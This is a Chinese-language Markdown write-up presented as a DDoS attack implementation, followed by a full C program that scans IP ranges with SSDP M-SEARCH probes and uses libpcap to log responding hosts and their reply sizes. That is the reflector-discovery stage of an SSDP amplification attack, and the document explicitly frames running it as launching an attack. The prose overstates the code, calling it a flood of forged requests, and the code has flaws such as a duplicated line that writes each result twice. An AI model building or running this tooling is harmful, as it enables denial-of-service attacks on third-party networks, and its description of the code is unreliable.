### DDoS攻击实现 - Markdown注释文档

#### 原理
DDoS（分布式拒绝服务）攻击利用大量恶意流量占用目标系统的资源，使其无法提供正常服务。此实现利用SSDP协议发送大量伪造的请求到目标地址，以达到消耗目标带宽和资源的目的。

#### 目标
通过发送大量UDP数据包到目标地址，以耗尽其带宽和网络资源，使目标服务无法正常响应合法用户的请求。

#### 功能
1. **网络扫描和攻击**:
   - 使用多线程扫描指定IP范围内的主机，向每个主机发送SSDP探测请求。
   - 每个线程负责一部分IP地址的扫描，通过UDP套接字发送伪造的SSDP请求。

2. **数据包捕获和处理**:
   - 使用libpcap捕获本地接收到的UDP数据包，过滤出目标地址为本机的数据包。
   - 将符合条件的数据包存储在环形缓冲区中，供后续处理。

3. **环形缓冲区和并发处理**:
   - 实现环形缓冲区存储捕获的数据包，使用互斥锁保护并发访问。
   - 启动读取线程从环形缓冲区中读取数据包并处理，统计发现的SSDP服务数量。

4. **状态输出和监控**:
   - 打印线程定期更新并输出当前扫描和攻击的状态信息，包括已找到的服务数量、发送的数据包总数、正在运行的线程数等。

#### 使用方法
1. **命令行参数**:
   - 程序通过命令行参数指定起始IP地址、结束IP地址、输出文件、线程数量和扫描延迟。
   - 示例：`./program 192.168.0.0 192.168.255.255 output.txt 10 100`

2. **编译和运行**:
   - 编译源代码并生成可执行文件。
   - 运行可执行文件，并传递必要的参数以启动攻击。



```c
/* SSDP SCANNER SCRIPT */
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h> // for exit()
#include <string.h> //for memset
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/socket.h>
#include <arpa/inet.h> // for inet_ntoa()
#include <net/ethernet.h>
#include <netinet/udp.h> //Provides declarations for udp header
#include <netinet/ip.h>  //Provides declarations for ip header
#include <pthread.h>
#include <semaphore.h>
#include <signal.h>
#include <sys/resource.h>
#include <unistd.h>
 
void process_packet(void *args, struct pcap_pkthdr *header, void *buffer);
 
//环形缓冲区结构,用于存储捕获的数据包
struct buffer
{
        void *data; //指向数据包的指针
        int size;   //数据包大小
        struct buffer *next; //指向下一个缓冲区节点
        struct buffer *prev; //指向上一个缓冲区节点
};
struct buffer *head; //缓冲区链表的头结点
 

char *ipv4;//用于存储本地主机IPv4地址的字符串,用于包捕获和过滤操作,使得程序只处理那些发送到本机的UDP数据包
int processed,over,total,i,j;//processed处理过的，over溢出包数量,total接收包总数
struct sockaddr_in dest;//dest保存数据包的目的地址,用于包过滤和网络数据的处理
pthread_mutex_t buf_mutex = PTHREAD_MUTEX_INITIALIZER;//用于保护缓冲区的互斥锁
sem_t loop_sem;//信号量用于同步缓冲区操作
int running_threads = 0;//运行线程数量
volatile int found_srvs = 0;//记录找到的服务数量
volatile unsigned long per_thread = 0;//每个线程处理的ip地址数量
volatile unsigned long start = 0;//网络扫描的起始ip地址
volatile unsigned long scanned = 0;//已扫描ip地址的数量
int sleep_between = 0;//控制每次扫描操作之间的暂停时间
volatile int bytes_sent = 0;//跟踪网络扫描过程中发送的数据包总字节数
volatile unsigned long hosts_done = 0;//跟踪网络扫描过程中已经完成扫描的主机数量
FILE *fd;//输出文件，保存扫描过程中发现的主机和服务信息

// 数据包读取线程，负责从环形缓冲区中读取并处理数据包
void *readthread()
{
        struct buffer *ourhead = head; //头指针
        struct sockaddr_in saddr; //
        while(1)
        {
                sem_wait(&loop_sem);//等待信号量
                while(ourhead->data == NULL){ ourhead = ourhead->next; }// 查找下一个有数据的节点
                pthread_mutex_lock(&buf_mutex);//上锁
                void *buf = malloc(ourhead->size); //存储数据包的副本
                int size = ourhead->size; 
                memcpy(buf, ourhead->data, ourhead->size);//数据包从环形缓冲区移动到buf
                free(ourhead->data);
                ourhead->data = NULL;
                ourhead->size = 0;
                pthread_mutex_unlock(&buf_mutex);//解锁
                memset(&saddr, 0, sizeof(saddr));
                struct iphdr *iph = (struct iphdr*)(buf + sizeof(struct ethhdr));// 获取 IP 头部，跳过以太网头部的大小
                saddr.sin_addr.s_addr = iph->saddr;// 从 IP 头部中提取源地址，并存储到 saddr 中
                struct udphdr *udph = (struct udphdr *)(buf + sizeof(struct ethhdr) + sizeof(struct iphdr));// 获取 UDP 头部，跳过以太网和 IP 头部的大小
                if(ntohs(udph->source) == 1900)// 检查 UDP 数据包的源端口是否为 1900（SSDP 服务端口）
                {
                        int body_length = size - sizeof(struct ethhdr) - sizeof(struct iphdr) - sizeof(struct udphdr);// 计算数据包体的长度
                        fprintf(fd,"%s %d\n",inet_ntoa(saddr.sin_addr),body_length); fprintf(fd, "%s %d\n", inet_ntoa(saddr.sin_addr), body_length); // 将源 IP 地址和数据包体的长度写入文件
                        fflush(fd);
                        found_srvs++;// 增加找到的服务数量计数
                }
                free(buf);
                processed++;// 增加已处理的数据包计数
                ourhead = ourhead->next;// 移动到下一个环形缓冲区节点
        }
}
 
void *flood(void *par1)
{
        running_threads++;// 增加正在运行的线程数量，表示有一个新的线程开始执行
        int thread_id = (int)par1;// 将传递给线程的参数 par1 转换为整数，作为线程的 ID
        unsigned long start_ip = htonl(ntohl(start)+(per_thread*thread_id));
        // 计算当前线程负责的起始 IP 地址，先将起始地址 start 转换为主机字节序（ntohl），
        // 然后根据线程 ID 计算该线程的起始 IP 范围，再转换回网络字节序（htonl）

        unsigned long end = htonl(ntohl(start)+(per_thread*(thread_id+1)));
        //同理，计算当前线程负责的结束ip地址

        unsigned long w;// 用于遍历当前线程负责的 IP 范围
        int y;
        unsigned char buf[65536];// 定义一个缓冲区 buf，用于存储要发送的数据包，最大为 65536 字节
        strcpy(buf, "M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:ssdp:all\r\nMan:\"ssdp:discover\"\r\nMX:3\r\n\r\n");// 将 SSDP 探测请求的字符串内容复制到缓冲区 buf 中，用于广播到网络查找设备
        int sizeofpayload = 90;// 设置要发送的数据长度为 90 字节，即字符串的长度
        int sock;// 定义一个套接字变量 sock，用于网络通信
        if((sock=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP))<0) {// 创建一个 UDP 套接字，如果返回值小于 0，表示创建失败
                perror("cant open socket");
                exit(-1);
        }

        // 遍历当前线程负责的 IP 范围，从起始 IP 到结束 IP 逐个发送请求
        for(w=ntohl(start_ip);w<htonl(end);w++)
        {
                struct sockaddr_in servaddr;// 定义一个 sockaddr_in 结构体变量 servaddr，用于存储目标地址
                bzero(&servaddr, sizeof(servaddr));// 将 servaddr 结构体清零
                servaddr.sin_family = AF_INET;// 设置地址族为 IPv4（AF_INET）
                servaddr.sin_addr.s_addr=htonl(w); // 设置目标 IP 地址，将当前遍历的 IP w 转换为网络字节序并赋值给 servaddr.sin_addr.s_addr
                servaddr.sin_port=htons(1900);// 设置目标端口为 1900，这是 SSDP 使用的默认端口
                sendto(sock,(char *)buf,sizeofpayload,0, (struct sockaddr *)&servaddr,sizeof(servaddr));// 发送 UDP 数据包，将 SSDP 请求发送到目标地址 servaddr
                bytes_sent+=sizeofpayload;// 增加已发送的数据字节数
                scanned++;// 递增已扫描的 IP 地址数量
                hosts_done++;// 增加已完成扫描的主机数量
                usleep(sleep_between*1000);// 暂停指定的时间（以毫秒为单位），避免过快地发送数据包
        }
        close(sock);// 关闭套接字，释放资源
        running_threads--;// 减少正在运行的线程数量，表示该线程已完成
        return;
}
 
void sighandler(int sig)
{
        fclose(fd);// 关闭文件指针 fd，确保在程序退出前保存所有数据并释放文件资源
        printf("\n");// 打印一个换行符，为了美观，避免提示信息和命令行混在一起
        exit(0);// 退出程序，并返回状态码 0 表示正常退出
}
 
void *printthread(void *argvs)
{
        char **argv = (char **)argvs;// 将输入参数转换为字符指针数组
        int threads = atoi(argv[4]);// 获取线程数量，并将字符串转换为整数
        pthread_t thread;// 定义线程标识符
        sleep(1);// 暂停1秒，确保其他操作已经就绪
        char *str_start = malloc(18);// 分配18字节的内存用于存储字符串
        memset(str_start, 0, 18);// 将内存初始化为0
        str_start = argv[1];// 将第一个参数赋值给 str_start
        char *str_end = malloc(18); 
        memset(str_end, 0, 18);// 将内存初始化为0
        str_end = argv[2];// 将第二个参数赋值给 str_end
        start = inet_addr(str_start);// 将起始IP地址字符串转换为网络字节序的整数
        per_thread = (ntohl(inet_addr(str_end)) - ntohl(inet_addr(str_start))) / threads; // 计算每个线程需要扫描的IP段
        unsigned long toscan = (ntohl(inet_addr(str_end)) - ntohl(inet_addr(str_start)));// 计算需要扫描的总IP数
        int i;
        for(i = 0;i<threads;i++){
                pthread_create( &thread, NULL, &flood, (void *) i);// 创建多个扫描线程，并传递线程编号作为参数
        }
        sleep(1);
        printf("Starting Scan...\n");// 输出开始扫描的提示信息
        char *temp = (char *)malloc(17);// 分配17字节的内存用于存储字符串
        memset(temp, 0, 17);// 将内存初始化为0
        sprintf(temp, "Found");// 将 "Found" 字符串格式化写入 temp
        printf("%-16s", temp); // 输出对齐后的字符串
        memset(temp, 0, 17);
        sprintf(temp, "Host/s");
        printf("%-16s", temp);
        memset(temp, 0, 17);
        sprintf(temp, "B/s");
        printf("%-16s", temp);
        memset(temp, 0, 17);
        sprintf(temp, "Running Thrds");
        printf("%-16s", temp);
        memset(temp, 0, 17);
        sprintf(temp, "Done");
        printf("%s", temp);
        printf("\n");
 
        char *new;
        new = (char *)malloc(16*6);// 分配足够的内存存放状态信息
        while (running_threads > 0)// 当有线程在运行时
        {
                printf("\r");// 回到行首，覆盖上一次的输出
                memset(new, '\0', 16*6);// 将内存清零
                sprintf(new, "%s|%-15lu", new, found_srvs);// 输出已找到的服务数
                sprintf(new, "%s|%-15d", new, scanned);// 输出已扫描的主机数
                sprintf(new, "%s|%-15d", new, bytes_sent);// 输出发送的字节数
                sprintf(new, "%s|%-15d", new, running_threads);// 输出正在运行的线程数
                memset(temp, 0, 17);
                int percent_done=((double)(hosts_done)/(double)(toscan))*100;// 计算完成的百分比
                sprintf(temp, "%d%%", percent_done);// 格式化为百分比字符串
                sprintf(new, "%s|%s", new, temp);// 添加完成百分比信息
                printf("%s", new);// 输出状态信息
                fflush(stdout);// 刷新输出缓冲区，立即显示
                bytes_sent=0; // 重置字节数
                scanned = 0;// 重置扫描数
                sleep(1);// 每秒更新一次
        }
        printf("\n");
        fclose(fd);
        exit(0);
}
 
int main(int argc, char *argv[ ])
{
    // 检查命令行参数数量是否小于6，如果小于则打印错误信息并退出
        if(argc < 6){
                fprintf(stderr, "Invalid parameters!\n");
                fprintf(stdout, "Usage: %s <ip range start (192.168.0.0)> <ip range end (192.168.255.255)> <outfile> <threads> <scan delay in ms>\n", argv[0]);
                exit(-1);
        }
        // 打开指定的输出文件（argv[3]），以追加模式
        fd = fopen(argv[3], "a");
        // 将扫描延迟（毫秒）转换为整数并存储在 sleep_between 变量中
        sleep_between = atoi(argv[5]);
        // 解析线程数量
        int num_threads = atoi(argv[4]);
        
        // 设置文件描述符限制，当前值为1024加上两倍的线程数量
        const rlim_t kOpenFD = 1024 + (num_threads * 2);
        struct rlimit rl;
        int result;
        rl.rlim_cur = kOpenFD;
        rl.rlim_max = kOpenFD;
        // 设置进程的最大文件描述符数
        result = setrlimit(RLIMIT_NOFILE, &rl);
        if (result != 0)
        {
                perror("setrlimit_nofile");
                fprintf(stderr, "setrlimit_nofile returned result = %d\n", result);
        }
        // 设置堆栈大小限制
        bzero(&rl, sizeof(struct rlimit));
        rl.rlim_cur = 256 * 1024;
        rl.rlim_max = 4096 * 1024;
        result = setrlimit(RLIMIT_STACK, &rl);
        if (result != 0)
        {
                perror("setrlimit_stack");
                fprintf(stderr, "setrlimit_stack returned result = %d\n", result);
        }
        // 设置SIGINT信号的处理函数为 sighandler
        signal(SIGINT, &sighandler);
 
        pcap_if_t *alldevsp;
        pcap_t *handle; //Handle of the device that shall be sniffed
 
        char errbuf[100] , *devname , devs[100][100];
        int count = 1 , n;
        // 查找所有可用的网络设备，失败时退出
        if( pcap_findalldevs( &alldevsp , errbuf) )
        {
                exit(1);
        }
        // 选择第一个网络设备作为设备名
        devname = alldevsp->name;
        ipv4 = malloc(16);// 分配内存用于存储IP地址字符串
        bzero(ipv4, 16);// 清零
        struct ifreq ifc;
        int res;
        int sockfd = socket(AF_INET, SOCK_DGRAM, 0);// 创建UDP套接字
 
        if(sockfd < 0) exit(-1);// 如果创建失败则退出
        strcpy(ifc.ifr_name, devname);// 复制设备名到 ifreq 结构体
        res = ioctl(sockfd, SIOCGIFADDR, &ifc);// 获取网络接口的IP地址
        close(sockfd);
        if(res < 0) exit(-1);// 如果获取失败则退出
        strcpy(ipv4, inet_ntoa(((struct sockaddr_in*)&ifc.ifr_addr)->sin_addr));// 将IP地址复制到ipv4字符串
        printf("Opening device %s for sniffing ... ", devname); // 打印打开设备的信息
        handle = pcap_open_live(devname, 65536, 1, 0, errbuf); // 打开设备用于嗅探数据包
 
        if (handle == NULL)
        {
                fprintf(stderr, "Couldn't open device %s : %s\n", devname, errbuf); // 如果打开失败则打印错误信息
                exit(1);
        }
        printf("Done\n");// 成功打开设备后打印完成信息
 
        sem_init(&loop_sem, 0, -1);// 初始化信号量
        i = 1024*1000;// 循环创建环形缓冲区的大小
        while(i--)
        {
                if(head == NULL)
                {
                        // 如果头节点为空，则创建环形缓冲区的头节点
                        head = (struct buffer *)malloc(sizeof(struct buffer));
                        bzero(head, sizeof(struct buffer));
                        head->data = NULL;
                        head->size = 0;
                        head->next = head;
                        head->prev = head;
                } else {
                        // 创建新节点并插入到环形缓冲区中
                        struct buffer *new_node = (struct buffer *)malloc(sizeof(struct buffer));
                        bzero(new_node, sizeof(struct buffer));
                        new_node->data = NULL;
                        new_node->size = 0;
                        new_node->prev = head;
                        new_node->next = head->next;
                        head->next = new_node;
                }
        }
        // 创建打印线程
        pthread_t prnthread;
        pthread_create( &prnthread, NULL, &printthread, (void *)argv);
        // 创建读取线程
        pthread_t redthread;
        pthread_create( &redthread, NULL, &readthread, NULL);
        // 开始捕获数据包，并调用 process_packet 处理每个数据包
        pcap_loop(handle , -1 , process_packet , NULL);
 
        return 0;
}
 
void process_packet(void* args, struct pcap_pkthdr* header, void* buffer)
{
    // 获取数据包的长度
    int size = header->len;

    // 获取IP头部，跳过以太网头部
    struct iphdr* iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
    // 清空目标地址结构体
    memset(&dest, 0, sizeof(dest));
    // 设置目标地址的IP为IP数据包中的目标地址
    dest.sin_addr.s_addr = iph->daddr;

    // 检查协议是否为UDP（协议号17）并且目标地址是否为本地IPv4地址
    if (iph->protocol == 17 && strcmp(inet_ntoa(dest.sin_addr), ipv4) == 0)
    {
        // 如果当前缓冲区的节点已被占用，计数器增加
        if (head->data != NULL) over++;
        // 加锁保护缓冲区的并发访问
        pthread_mutex_lock(&buf_mutex);
        // 分配内存用于存储数据包
        void* temp = malloc(size);
        // 复制数据包到新分配的内存区域
        memcpy(temp, buffer, size);
        // 将新分配的内存区域指针存储在当前环形缓冲区节点
        head->data = temp;
        head->size = size;
        // 移动到下一个节点
        head = head->next;
        // 解锁缓冲区
        pthread_mutex_unlock(&buf_mutex);
        // 发送信号通知有新的数据包可用
        sem_post(&loop_sem);
        // 统计处理的总数据包数
        total++;
    }
}